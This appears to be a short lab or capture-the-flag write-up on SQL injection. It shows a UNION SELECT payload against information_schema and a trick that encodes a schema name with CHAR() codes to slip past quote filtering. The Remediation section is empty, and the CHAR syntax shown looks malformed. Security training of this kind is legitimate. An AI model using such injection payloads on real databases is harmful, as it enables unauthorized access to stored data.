# Brute Force

From exploiting [SQL Injection Vulneribilities](../0x0a-sql_injection-members/README.md), it is recoginzed that the schema `Member_Brute_Force` existed on the database. We know the schema exists, but certainly don't know what tables, or other information exists in the schema.

But using the query `1 and 1=1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE schema_name='Member_Brute_Force'` will give an error, as the quotation would cause an error from the php.

In order to bypass, following script will create a set of char:

```
$ python -c 'print([ord(c) for c in "Member_Brute_Force"]);'
[77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101]
```

so this can be directly used as this
```
where='Member_Brute_Force'
where=CHAR([77, 101, 109, 98, 101, 114, 95, 66, 114, 117, 116, 101, 95, 70, 111, 114, 99, 101])
```

by doing so, we can find `db_default` table in `Member_Brute_Force` schema:

(Image Here)



## Remediation

